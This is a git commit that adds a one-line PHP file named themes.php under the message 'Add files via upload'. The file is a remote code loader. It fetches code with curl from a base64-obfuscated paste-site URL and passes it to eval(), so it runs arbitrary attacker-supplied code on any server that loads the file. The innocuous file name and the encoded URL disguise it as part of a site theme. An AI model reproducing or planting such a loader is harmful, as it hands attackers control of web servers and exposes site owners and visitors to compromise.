6a8a61cb3ff36b76045d55fa3ae99dae917dd788
mgrayyz <lutfiindahsusanti@gmail.com>
2025-01-11 19:02:53 +0700

    Add files via upload

---
+++ themes.php
@@ -0,0 +1,1 @@
+<?pHp   function get($url) {    $ch = curl_init();    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    curl_setopt($ch, CURLOPT_URL, $url);    $data = curl_exec($ch);    curl_close($ch);    return $data;}$x= '?>';      eval($x . get(base64_decode('aHR0cHM6Ly9wYXN0ZS56b25lLXhzZWMuY29tL3Jhdy9FTUR6cWM')));?>
